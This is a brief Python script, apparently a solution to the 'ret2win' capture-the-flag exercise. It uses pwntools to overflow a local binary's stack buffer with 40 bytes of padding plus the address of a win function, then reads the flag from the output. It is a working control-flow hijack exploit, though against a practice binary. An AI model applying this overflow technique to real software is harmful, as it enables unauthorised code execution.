import pwn

# Setup enviroment
process = pwn.process("./ret2win")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("ret2win")

payload = "A"*40 + pwn.p64(elf.symbols["ret2win"])
print payload
process.readline()
process.readline()
process.readline()
process.readline()
process.sendline(payload)
process.readline()
process.readline()
process.readline()
print process.readline().split(':')[1]
